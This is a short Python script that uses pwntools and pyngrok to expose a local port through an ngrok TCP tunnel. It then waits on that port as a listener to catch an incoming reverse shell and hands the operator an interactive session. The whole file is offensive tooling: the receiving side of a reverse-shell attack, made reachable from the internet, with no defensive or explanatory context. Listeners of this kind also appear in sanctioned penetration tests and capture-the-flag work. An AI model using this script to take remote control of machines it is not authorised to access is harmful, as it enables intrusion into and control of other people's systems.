from pwn import *
from pyngrok import ngrok

class ShellHandler:
    def __init__(self, port=4444):
        self.port = port
        
    def create_listener(self):
        """
        Create the reverse shell listener
        """
        listener = listen(self.port)
        connection = listener.wait_for_connection()
        shell = connection.interactive()
    
    def tunnel_opener(self):
        """
        Open the ngrok tunnel
        """
        try:
            tunnel = ngrok.connect(self.port, "tcp")
            print(tunnel)
        except Exception as e:
            print(f"An error occurred while opening the tunnel: {e}")
	
    def main(self):
        self.tunnel_opener()
        self.create_listener()

if __name__ == "__main__":
    handler = ShellHandler(1234)
    handler.main()
